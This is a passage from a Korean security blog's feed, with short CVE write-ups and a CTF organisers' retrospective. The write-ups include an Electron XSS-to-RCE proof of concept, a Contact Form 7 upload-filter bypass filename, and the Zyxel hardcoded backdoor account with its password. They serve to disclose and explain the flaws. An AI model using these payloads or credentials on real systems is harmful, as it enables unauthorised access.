parsing 할 때 파일에서 32비트 값을 읽어 <code>0x23c</code>를 곱합니다. 피연산자는 최대 10비트이므로 overflow 되어 32비트로 잘려서 heap에 할당됩니다. 하지만 곱셈 하기 전의 값을 스택에 저장하고 사용하여 할당된 범위 밖에 값이 써지게 됩니다.</p><p>세 가지 취약점 모두 취약점을 트리거하기 위해 해커는 타깃이 문서를 열도록 유도해야 합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>integer overflow</tag>
      
      <tag>idioth</tag>
      
      <tag>sign extension</tag>
      
      <tag>integer conversion</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-35717: RCE through XSS</title>
    <link href="/2021/01/06/fabu1ous/2021-01-06/"/>
    <url>/2021/01/06/fabu1ous/2021-01-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://medium.com/bugbountywriteup/remote-code-execution-through-cross-site-scripting-in-electron-f3b891ad637">zonote RCE through XSS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>zonote &lt;= 0.4.0</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>문서 작성 Electron App인 zonote에서 RCE 취약점이 공개되었습니다. zonote 문서에 마크다운과 html을 삽입해 XSS(Cross-Site-Script) 공격을 할 수 있는데 악용 범위를 RCE까지 확장할 수 있습니다. </p><blockquote><p>It is paramount that you do not enable Node.js integration in any renderer (<code>BrowserWindow</code>, <code>BrowserView</code>, or <code>&lt;webview&gt;</code>) that loads remote content.</p></blockquote><p><a href="https://www.electronjs.org/docs/tutorial/security#2-do-not-enable-nodejs-integration-for-remote-content">Electron의 공식문서</a>에 따르면 원격 콘텐츠에 접근하는 모든 renderer는 Node.js intergration이 비활성화되어있어야 합니다. XSS 취약점이 존재해도 그 악용 범위를 renderer 내부로 제한하기 위해 Electron 5.0.0부터 권장해온 기본 설정입니다. </p><ul><li>다음은 zonote의 main.js코드 일부입니다.</li></ul><pre><code class="hljs js"><span class="hljs-keyword">const</span> browserWindowsOptions = &#123;    ...    webPreference: &#123;        nodeIntergration : <span class="hljs-literal">true</span>,        enableRemoteModule : <span class="hljs-literal">true</span>    &#125;&#125;</code></pre><p>Node.js intergration이 활성화되어있으므로 XSS를 통한 RCE 취약점이 존재합니다.</p><ul><li>PoC</li></ul><pre><code class="hljs markdown"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">onemouseover</span>=<span class="hljs-string">&quot;</span></span></span><span class="xml">try&#123;</span><span class="xml">const &#123;shell&#125; = require(&#x27;electron&#x27;);</span><span class="xml">shell.openExternal(&#x27;file:C:/Windows/System32/calc.exe&#x27;)</span><span class="xml">&#125;catch(e)&#123;</span><span class="xml">console.error(e)</span><span class="xml">&#125;&quot;&gt;</span>Hover Me<span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-35489 : Unrestricted File Upload Vulnerability in WordPress Plugin</title>
    <link href="/2021/01/05/l0ch/2021-01-05/"/>
    <url>/2021/01/05/l0ch/2021-01-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.wpsec.com/contact-form-7-vulnerability/">https://blog.wpsec.com/contact-form-7-vulnerability/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Contact Form ≤ 7 5.3.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>WordPress 플러그인인 Contact Form 7은 폼메일 플러그인으로 폼메일 양식을 쉽게 생성할 수 있어 인기 있는 플러그인 중 하나입니다. 해당 플러그인에서 허용되지 않은 확장자 필터링을 우회해 업로드할 수 있는 취약점이 발견되었습니다.</p><p>취약점의 세부 정보는 다음과 같습니다.</p><ol><li>해커는 특수 문자가 포함된 이중 확장자 파일을 업로드할 수 있습니다. ex) <code>mal.php .jpg</code> (공백  = \t)</li><li>Contact Form 7은 업로드된 파일 이름에서 특수 문자를 제거하지 않아 첫 번째 확장자 이후 구분 문자로 인해 두 번째 파일 확장자를 버립니다.</li><li>결과적으로 업로드되는 파일 이름은 <code>mal.php</code>가 되고 업로드에 성공합니다.</li><li>해커는 임의 코드 실행을 통해 업로드된 파일에 접근 및 실행이 가능합니다.</li></ol><p>해커는 이를 악용해 서버에 웹쉘과 같은 파일을 제한 없이 업로드할 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://github.com/dn9uy3n/Check-WP-CVE-2020-35489">https://github.com/dn9uy3n/Check-WP-CVE-2020-35489</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>unrestricted file upload</tag>
      
      <tag>wordpress</tag>
      
      <tag>plugin</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-29583: Zyxel 방화벽, VPN 제품에서 백도어 계정 발견</title>
    <link href="/2021/01/04/idioth/2021-01-04/"/>
    <url>/2021/01/04/idioth/2021-01-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/01/secret-backdoor-account-found-in.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+TheHackersNews+(The+Hackers+News+-+Cyber+Security+Blog)">Secret Backdoor Account Found in Several Zyxel Firewall, VPN Products</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>방화벽<ul><li>ZLD V4.60 펌웨어를 사용하는 ATP, USG, USG FLEX, VPN 시리즈</li></ul></li><li>AP 컨트롤러<ul><li>NXC 2500, NXC5500</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Zyxel은 해커가 펌웨어에 하드 코딩된 undocumented account(FTP를 통한 자동 펌웨어 업데이트 제공을 위한 계정)를 통해 관리자 권한으로 로그인하고 네트워크 장비를 손상시킬 수 있는 취약점에 대한 패치를 발표했습니다.</p><p>이 취약점은 CVE-2020-29583으로 undocumented account인 <code>zyfwp</code>와 수정할 수 없는 비밀번호 <code>PrOw! aN_fXp</code>가 평문으로 저장되어 있으며 해당 계정을 통해 해커가 SSH 서버나 웹 인터페이스에 관리자 권한으로 접근할 수 있습니다.</p><pre><code class="hljs routeros">$ ssh zyfwp@192.168.1.252Password: Pr*******XpRouter&gt; show<span class="hljs-built_in"> users </span>current<span class="hljs-literal">No</span>: 1  Name: zyfwp  Type: admin(<span class="hljs-built_in">..</span>.)Router&gt;</code></pre><p>이 취약점을 악용해 해커는 방화벽의 설정을 조작하여 특정 트래픽을 허용하거나 막을 수 있고, 트래픽을 가로채거나 VPN 계정을 생성하여 네트워크에 대한 접근 권한을 가질 수 있습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html">https://www.eyecontrol.nl/blog/undocumented-user-account-in-zyxel-products.html</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>zyxel</tag>
      
      <tag>backdoor</tag>
      
      <tag>undocumented account</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Daily-Life] 크리스마스 CTF 2020 운영 후기</title>
    <link href="/2021/01/03/idioth/christmasctf2020-review/"/>
    <url>/2021/01/03/idioth/christmasctf2020-review/</url>
    
    <content type="html"><![CDATA[<h1 id="사건의-전말"><a href="#사건의-전말" class="headerlink" title="사건의 전말"></a>사건의 전말</h1><p>매년 크리스마스에 이벤트 형식으로 열리는 솔로들을 위한(?) 크리스마스 CTF의 주최를 이번에 세종대학교 정보보안 동아리 SSG와 함께 맡았습니다. 사실 우리가 문제를 만들어야 된다는 이야기도 갑자기 들었죠. Fabu1ous는 맡게 된 과정을 눈 앞에서 목격했으나 idioth과 L0ch는 통보를 받았습니다…</p><blockquote><p>??? : 크리스마스 때 뭐하냐<br>idioth : 데이트요<br>??? : 여자 친구 없잖아<br>idioth : 그때는 있겠죠<br>??? : 문제나 만들어라<br>L0ch : 전 있는데용 ㅎㅎ<br>??? : 알 바 아니고</p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image0.png"></p><p>불안한 직감은 언제나 옳습니다. ‘우리 문제 만들어야 돼’를 듣자마자 직감했습니다. 아 크리스마스 CTF구나… 처음엔 인당 두 문제씩 만들기로 했습니다. 하지만 여기서 사건이 하나 벌어지는데…</p><p>데이터 챌린지를 나가기로 했었는데 팀장 녀석이 분야를 착각해서 신청을 못했습니다. 그로 인해 각 3문제를 만들기로…ㅋㅋㅋㅋ</p><blockquote><p>idioth : 얘들아 우리 세 문제씩 만들기로 했어 ㅎㅎ<br>L0ch, Fabu1ous : ???<br>idioth : 데이터 챌린지 신청 못함 ㅋㅋㅋㅋㅋㅋ</p></blockquote><p><img src="/2021/01/03/idioth/christmasctf2020-review/image1.png"></p><p>처음에 만들기로 한 문제에 대한 버그 클래스는 아래와 같습니다만…</p><ul><li>idioth<ul><li>rev : custom packer</li><li>web : cve-2020-9484 tomcat rce</li><li>misc : snake</li></ul></li><li>L0ch<ul><li>pwn : Windows pwnable uaf</li><li>pwn : Linux pwnable type confusion</li><li>rev : obfuscate</li></ul></li><li>Fabu1ous<ul><li>pwn : angr challenge</li><li>pwn : uninit stack</li><li>misc : 미정</li></ul></li></ul><p>여러 가지 이유로 많이 바뀌었습니다… 코로나 때문에 갑자기 학기가 1주일 당겨지면서 11월과 12월 초가 통째로 바빠질 줄은 그들은 몰랐습니다…</p><p>학기가 끝난 후 그들은 랩실에 갇혀서 근 1주일을 밤새며 문제를 만들기에 박차를 가하게 됩니다.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image2.png"></p><p>대회 전날 그들의 모습</p><h1 id="idioth"><a href="#idioth" class="headerlink" title="idioth"></a>idioth</h1><p>안녕하세요. idioth입니다. 뭐… 처음에 대회를 한다 했을 때는 좀 많이 당황했습니다.</p><p>일단 5월 중순에 소집 해제하고 이제 막 다시 공부를 시작한 참이라서… 출제하기 전까지 CTF를 2개 정도 나갔는데 문제를 baby-rev 정도밖에 못 풀었습니다. 뭔가 좀 많이 바뀐 것 같더라고요. 포너블을 내기에는 기억도 어렴풋하고…</p><p>암호 공부를 해야겠다는 생각은 늘 하고 있었는데 최근에 어떤 문제들이 많은가 봤더니 암호랑 접목을 많이 시켜서 나오더라고요. 일단 암호는 내가 할 줄 모르니 패스… 그럼 뭐 만들지? 하다가 복무 중에 했던 Custom Packer 스터디가 떠올랐습니다.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image3.png"></p><p>아! 이거다! 패커 딱 대!</p><p>문제 만들어야 된다는 소리를 들은 후 주제를 대충 정한 후 바로 다음 달부터 패커 개발에 들어갔습니다. 일단 패커 관련된 문제가 나오지 않았다는 것은… 다들 아시죠? (ㅎㅎ)</p><ol><li>64비트로 만들자</li><li>어 내가 그때 스터디했던 건 32비트네?</li><li>너무 옛날 거네? 게다가 게시글도 사라졌네?</li><li>…github에 올라와있는 걸 보고 어떤 흐름으로 가면 좋은 지 보자</li></ol><p>그리고 열심히 열심히 한 달에 걸쳐서 완성을 했습니다! 역시 난 한다면 하는 남자! 하지만…</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image4.png"></p><p>코드를 계속 보는데도 도대체 어디가 문제인지 모르겠습니다… 아 시간이 없는데 이제 과제 폭풍이 몰려오고 있는데… 어떡하지?</p><p>일단 tomcat부터 만들자… tomcat 자체에 취약점이 있으니 웹 사이트 구현하고 트리거할 수 있게 기능 구현만 하면 되니까 금방 하겠지? 웹 하는 애들이 도와준댔어.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image5.png"></p><p>응 그런거 없어~ 웹 만들어 본거라곤 공부 처음 시작할 때 html, php와 django를 통해 만들어 본 것이 전부라서 맨 땅에 헤딩을 하면서 구현을 시작했습니다. 게다가 학교에서 python 학부 수업 조교도 진행해서 뭔가 할 일이 굉장히 많았죠(핑계야)</p><blockquote><p>기상 - 하루 한 줄 - 조교 - 과제 - (블로그 글) - 문제 만들기</p></blockquote><p>위의 순환을 계속 돌았습니다. 겉으로의 구현도 끝나고 파일 업로드 등의 구현도 11월 말에 다 끝났습니다. 하지만 가장 큰 문제가 있었습니다.</p><p>버전은 어떻게 알려 줄 것이고 지금 상태에선 session 폴더와 모든 것이 게싱이다.</p><p>여러 가지 사람들과 이야기를 해본 끝에 LFI를 통해서 모든 파일을 다 읽을 수 있게 하도록 했습니다.</p><p>그 과정에서 path traversal 필터링을 거는 게 좋을까 말까에 대해서는 그래도 <code>../</code> 같은 기본적인 거는 걸어놓는 게 좋지 않을까?라는 생각을 했습니다.</p><p>근데 주변에서 어차피 그런 거 보이면 일단 때려 넣고 보니까 기본적인 거는 걸어놓는 게 좋아.라는 말을 듣고 <code>gift</code> 문제가 탄생하게 됩니다.</p><p>다 만들었을 때는 그래도 웹 처음 만든 것 치고 괜찮은 것 같은데?라는 생각을 했으나… 저의 오만함이었음을 깨달았습니다. 으으… 저는 게싱을 최대한 줄였다고 생각했지만 제가 만들었던 문제라서 그렇게 생각했던 것 같습니다 ㅜㅜ…</p><p>하지만 가장 큰 문제는 <code>gift</code> 하나 만들었는데 대회가 일주일 남았다.</p><p>일단 리버싱 문제를 하나 만들어야지… 그냥 간단한 것 내야겠다… crackme 하나 해야지~ 하고 만들었습니다. 근데 뭔가 너무 허전해서 고민을 했습니다. 아 뭔가 없나… 하다가 딱 생각이 났습니다.</p><p>오 이제 맥도 ARM으로 나오는데 ARM 리버싱 할까? ㄱㄱㄱㄱ arm 어셈 분석하는 걸로 내고~ ida hexrays를 막아놓자. 어차피 잘하시는 분들은 arm도 금방 보실 테고 하니까 anti-hexrays는 금방 푸시겠지?</p><p>ida에서는 깨져서 나오는데… 왜 ghidra에서는 제대로 나오는 걸까…?</p><p>??? : 야 그냥 핸드 레이로 내자</p><p>idioth : ㄱ 어차피 baby 용으로 낸 거니까 괜찮겠지?</p><p>-<code>lock</code> 끝-</p><p>아 이제 snake 하나만 남았네요 ㅎㅎ misc 문제라서 너무 부담이 없습니다~ 뱀 게임 재미나게 하나 만들어야지<del>~</del>하고 생각하는 와중에 앞을 보니까 절망의 구렁텅이에 빠진 한 남자가 있었습니다.</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image6.png"></p><blockquote><p>L0ch : 나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼나만익스안돼</p></blockquote><p>앞에서 보는데 진짜 너무 무섭더라고요. 그래서 그냥 제 misc 문제를 주고 reversing을 제가 내기로 했습니다. 참가한 대회 중 하나에서 angr로 푼 문제가 있어서 angr 문제를 내자. 근데 이것도 arm으로 내면 재밌겠당. 하고 후딱 만들었습니다.</p><p>근데 arm에서는 왜 simulation manager를 돌려도 값이 안 나오지? 그냥 x64로 완성하고 난 후 L0ch를 보니 뱀 게임을 완성하고 자기 type confusion 못 만들 것 같은데 baby pwnable 뭐 낼 지 물어보더라고요. 그래서 그냥 던져 줬습니다. arm rop 재밌을 듯? <code>baby_RudOlPh</code> 탄생~</p><p>근데 angr 문제를 검수하고 값을 연산하는 로직을 수정하고 나니까 이상하게 값이 밀려서 나왔습니다. 처음에 c++로 짰었고 전체적으로 계속 수정을 했는데 input이 이상하게 들어가거나 해서 코드가 전체적으로 꼬여버렸습니다. 결국 c로 옮기게 되었고 c로 옮겨서 나오는 값들을 확인해보자 byte 몇 개가 사라지더라고요.</p><p>대회는 당장 내일이고 급하니까 범위가 넘어가서 그런가 보다 생각하고 그냥 크게 연산하는 로직들을 지워버리고 만들었습니다. 그렇게 <code>angrforge</code> 탄생. 사실 이 문제는 욕먹을 거라 생각했습니다. 손으로 푸신 분 계시던데 진짜 죄송합니다… 다음에 문제 만들 일이 생긴다면 이런 *** 같은 의도 파악조차 안 되는 문제는 만들지 않겠습니다.</p><p>대회는 여차저차 잘 끝났지만 마음이 불편했습니다. 나는 나대로 열심히 했는데 결과물이 좋지 않았으니까요. 일단 내가 생각한 대로 만들어진 문제가 없었습니다. <code>lock</code>이나 <code>angrforge</code> 같은 경우는 시간에 쫓겨 로직에 대한 큰 고민 없이 만든 문제들이라서 마음에 들지 않았습니다.</p><p>거의 대부분의 문제 제작 시간을 <code>gift</code>에 쏟았고, 실제 이러한 서비스가 운영돼서 이 취약점이 존재한다면 이렇게 접근하면 재밌겠다.라는 시나리오도 잘 만들었다고 생각했습니다.</p><p>근데 이건 출제자의 생각이지 참여하신 분들이 그렇게 생각 안 하신다면 그게 맞는 거죠.</p><p>대회가 끝나고 나서 심야 버스를 타고 집으로 출발했습니다. 거의 40시간 넘게 깨어 있었던 것 같네요. 버스에서 잠도 안 오더군요. 그냥 현타가 세게 왔습니다.</p><p>아… 내가 진짜 못하는구나. 내가 생각했던 것이나 다른 문제들을 풀거나 분석하면서 봤던 로직들을 구현하지도 못하고, 생각의 넓이나 깊이도 부족하구나. 내가 생각한 것보다 사람들은 더 넓은 것을 보는구나.</p><p>돌이켜 생각해보니 사람들이 봤을 때 주제나 컨셉이 재밌고 신선한 것에만 너무 신경 쓰지 않았나? 내가 사람들에게 그 재미를 온전히 전달할 만큼의 기본 베이스가 되는가?라는 생각이 들었습니다.</p><p>집에 돌아와서 샤워하고 누웠는데 해가 뜰 때까지 잠을 못 잤습니다. 잡생각이 많아서 일단 지쳐서 잠들고 일어나니 상위권 팀들 라업이 기대가 되더군요. <code>lock</code>이랑 <code>angrforge</code>는 모르겠고 <code>gift</code>를 어떻게 푸셨고 어떻게 느끼셨는지에 대한 생각이 정말 컸습니다.</p><p>라업을 다 보고 나서 라업을 다 뜯어고쳤습니다. 좀 더 내가 생각했던 것과 고민했던 것이 무엇인지 그리고 2021년에는 어떤 식으로 공부하면 좋을지 이번 기회에 제가 부족했던 것, 부족함을 알고 있었지만 애써 외면하던 것들에 직면하게 되어서 좋은 경험이었던 것 같습니다.</p><p>다들 미천한(?) 문제 푸시느라 고생 많으셨습니다. 재밌게 즐기셨다면 정말 좋았을 텐데…! 다들 새해 복 많이 받으세요!</p><h1 id="L0ch"><a href="#L0ch" class="headerlink" title="L0ch"></a>L0ch</h1><p>안녕하세요. L0ch입니다! CTF 문제 출제 경험이라고는 동아리 내부 CTF 밖에 없던 저에게 크리스마스 CTF 문제를 만들어야 한다는 소식을 들었을 때..</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image7.png"></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image8.png"></p><blockquote><p>??????? 문제를 만들라구요???</p></blockquote><p>진짜 딱 저 표정이었습니다. 거짓말 아니고 진짜로요.</p><p>국방의 의무를 수행하느라 백지가 된 머리로 열심히 따라가고 있던 와중에 (대한민국 군인들 화이팅 ㅠㅠ) CTF 문제를 그것도 세 문제나 만들라니요.. 아무튼 데이터 챌린지 신청 못한 팀장 탓임 @idioth @idioth @idioth</p><p>그렇게 열심히 최근 CTF 트렌드를 찾아보고 어느 정도 틀을 잡아가기 시작했습니다.</p><p>첫 번째 문제였던 address_book 이 나오게 된 배경입니다.</p><p>때는 하루 한 줄을 쓰기 위해 떠돌아다니던 중 Chrome의 공유 포인터 관련 UAF 취약점 정보를 보게 되었죠. </p><p>거기에 영감을 받아 공유 포인터를 커스텀으로 구현해서 거기에 취약점을 만들어볼까? </p><ul><li>MS tuesday patch의 diff 패치를 바이너리에 적용해 binary diffing으로 취약점을 찾을 수 있도록 해볼까? </li></ul><p>이렇게 해서 나온 문제입니다. 물론 사람 인생이 계획대로만 될 리가 있나요 ㅎㅎ</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image9.png"></p><p>문제는 제가 윈너블 경험이 부족하다는 점이었습니다. 버그헌팅을 하면서 원데이 몇 번 분석해본 게 전부인 저에게 취약점 설계부터 익스까지 한다? 멘탈이 아주 곱게 갈릴 거라는 걸 시작부터 예감했죠.</p><p>우선 C++의 공유 포인터를 구현하려면 당연히 C++을 써야 하는데 기본적인 OOP 개념이 부족했습니다. 문제를 만들던 중 코드 리뷰를 해보니까 진짜 개판 오 분 전이었는데 더한 문제는 어떻게 고쳐야 할지를 몰랐습니다..   분석하시면서 이거 왜 이렇게 짜 놨지 하는 부분이 있었을 텐데, 다 부족한 저의 개발실력 때문입니다.. </p><p>또 하나 문제는.. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image10.png"></p><blockquote><p>아니 다 만들어놓고 익스가 왜 안되는데!!!!!!!!!!!!!!!!!!!!!!!!!!</p></blockquote><p>원래 익스에 포함되는 과정 중 하나였던 <code>flag.txt</code> 파일 open을 함수가 계속 <code>응 파일 못 열었어 ㅋㅋ</code> 를 뱉는데 이게 무슨 경우지? 왜 파일을 못 여는 거지?? 혼잣말하면서 욕도 해보고 달래도 보고 열심히 삽질을 했지만 원인을 찾지 못해 결국 바이너리 내부에서 <code>flag.txt</code> 를 open만 하고 익스 과정 중 ROP 체인에서 open 과정을 빼고 file descriptor를 이용해 flag를 출력하는 것으로 타협을 볼 수밖에 없었습니다.</p><blockquote><p>후일담<br>idioth : ㅋㅋㅋㅋ 너 address book 익스 할 때 진짜 무서웠던 거 아냐<br>본인 : ??? 왜요 나 왜<br>idioth : 누구 하나 걸리면 진짜 죽는단 표정이었어<br>Fabu1ous : ㅇㅈ<br>본인 :</p></blockquote><p>취약점을 찾기 어렵게 만든 이유가 diff patch를 이용한 binary diffing으로 취약점을 찾을 수 있도록 의도한 거지만.. 계획에 차질이 생겨 diff patch도 적용을 못해 결과적으로 좋지 않은 퀄리티의 아쉬운 문제라고 생각합니다… </p><p>그렇게 한 문제를 마무리하고 보니,  왜 시작도 안 한 두 문제가 남아있고 저는 기말고사를 눈앞에 두고 있는 걸까요?</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image11.png"></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image12.png"></p><blockquote><p>저는 그렇게.. 학점을 놓아주었습니다</p></blockquote><p>학점을 포기한 대가로 나머지 baby_RudOlPh와 picky_eater를 구상할 수 있었습니다. <em><del>등가교환의 법칙</del></em></p><p>picky_eater는 idioth 팀장님의 아이디어를 쏙 빼왔습니다. address book과 고군분투하고있던 저를 불쌍하게 봤었나봐요. “이거 네가 할래?” 라며 snake 게임 컨셉의 아이디어를 주더라고요. 그 정도로 불쌍해 보였나?;; 아무튼 감사합니다 ㅎㅎ<br>그래도 만들 땐 재밌게 만들었던 문제인 것 같습니다!</p><p>마지막 baby_RudOlPh는 두 줄로 설명하겠습니다. </p><blockquote><p>??? : (회의 도중) 님들 생각해보니까 뉴비용 포너블 문제가 없는데요?</p></blockquote><p>그래서 만들게 된 ARM(AArch64) ROP 문제입니다. 그냥 내면 재미없잖아요! 그래서 ARM을 끼얹었죠</p><p>(사실 기간 내에 원래 생각했던 type confusion 문제를 못 만들 것 같아서 뉴비문제 냈다는 건 안 비밀)</p><p>정리하고 보니까 더 잘할 수 있었음에도 그러지 못해 아쉬운 감정이 많이 남는 대회라고 생각이 드네요. 나중에 다른 CTF에 문제를 출제할 수 있는 기회가 올진 모르겠지만 기회가 된다면 더 많이, 철저하게 준비해서 좋은 퀄리티의 문제를 만들 수 있도록 노력하겠습니다. 부족한 제 문제를 풀어주신 모든 참가자 여러분들께 감사의 말씀드립니다..!</p><h1 id="Fabu1ous"><a href="#Fabu1ous" class="headerlink" title="Fabu1ous"></a>Fabu1ous</h1><ul><li>Oil-system &amp; Match-maker</li></ul><p><img src="/2021/01/03/idioth/christmasctf2020-review/image13.png"></p><p>버그 잡는 건 정말 힘든 작업이군요. 대회 때 oil-system의 풀이 수가 20이던데 아마 모두 언인텐디드일거라 생각합니다. Match-maker도 메모리 leak 중 언인텐디드가 한 개 있었습니다. 솔직히 아주 조금 억울한 부분이 있지만 그게 무슨 의미가 있겠습니까… 이런 상황이 발생한 이유를 적어보고 성찰의 시간이나 가져봅시다.</p><ol><li><p>뱁새가 황새를 따라가면 다리가 찢어진다</p><p> 문제를 만들 때까진 몰랐는데 지금 보니 정말 별거 없는 문제더군요. 큰 틀만 보면 리턴 값을 조작해 <code>win()</code> 함수를 실행하는 문제들과 크게 다를 게 없습니다. 흔히 아는 만큼 보인다고 하죠. 어려운 문제를 만들겠다는 의욕은 앞섰지만 실력은 안 따라주고 결국 쓸데없이 복잡한 동작을 하는 문제가 탄생한 거 같습니다.</p></li><li><p>돌다리도 두들겨 보고 건너라.</p><p> 최종 검사하세요. 두 번 하세요. 최종 검사의 검사도 하세요. 이번 사건 이후로 어떤 일이든 쉽게 확신을 갖진 않을 것 같습니다.</p></li></ol><ul><li>No g</li></ul><p>설문 조사에 의하면 이번 대회에서 호불호가 가장 심했던 문제네요. 셜록홈즈 암호( 춤추는 사람 그림 암호 )와 비슷한 느낌으로 crypto와 misc 그 사이 어딘가의 문제를 만들려고 해 봤습니다. No g라는 제목에서 힌트를 얻어 쉽게 푸신 분들도 있지만 그러지 못하고 기상천외한 삽질을 하신 분들도 있더군요. 가볍게 misc나 풀면서 머리 식히려고 봤다가 고통받으신 분들께 사죄하겠습니다. ㅎㅎ</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image14.png"></p><p>죄송해요 ㅠㅠㅠㅠㅠ</p><p>2년 연속 Christmas CTF에 대해 안 좋은 기억만 남네요. 올해는 꼭 여친 사귀어서 Christmas CTF 말고 데이트하러 가야겠습니다. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image15.png"></p><p><del>아이씨… 누가 여기다 양파를 가져다 놓은 거야!?</del></p>]]></content>
    
    
    <categories>
      
      <category>Daily-Life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>L0ch</tag>
      
      <tag>review</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-10148: SolarWinds Orion API auth bypass to RCE</title>
    <link href="/2021/01/02/fabu1ous/2021-01-02/"/>
    <url>/2021/01/02/fabu1ous/2021-01-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10148">CVE-2020-10148</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2019.4 HF 6 이전 버전</li><li>2020.2.1 HF 2 이전 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SolarWinds Orion platform에서 API 인증 우회를 통한 원격 코드 실행 취약점이 패치되었습니다. FireEye가 작년 12월 공개한 Sunburst backdoor로 인해 SolarWinds Orion platform은 큰 이슈가 되었습니다. 그 후 SolarWinds Orion platform에 대한 깊은 분석이 진행되면서 발견된 취약점 중 하나가 CVE-2020-10148입니다.</p><p>SolarWinds Orion platform은 시스템 모니터링 및 관리 목적으로 만들어진 infrastructure입니다. 사용자는 Orion Website를 통해 서버에 설치된 Orion에 접근해 서버를 관리할 수 있으며 SolarWinds Orion API를 요청해 SolarWinds Orion platform을 사용할 수 있습니다.</p><p>URI를 통해 Orion 서버에 요청을 보낼 때 <code>Request.PathInfo</code> 파라미터에 <code>WebResource.adx</code>, <code>ScriptResource.adx</code>, <code>i18n.ashx</code>, <code>Skipi18n</code>등의 값을 지정하면 SolarWinds가 <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcontext.skipauthorization?view=netframework-4.8">SkipAuthorization</a> flag를 설정합니다. 이로 인해 해커가 인증 절차를 건너뛰고 API 커멘드를 실행할 수 있게 됩니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>authentication bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-17057 : Microsoft Windows Uninitialized Pointer EoP</title>
    <link href="/2021/01/01/l0ch/2021-01-01/"/>
    <url>/2021/01/01/l0ch/2021-01-01/</url>
    
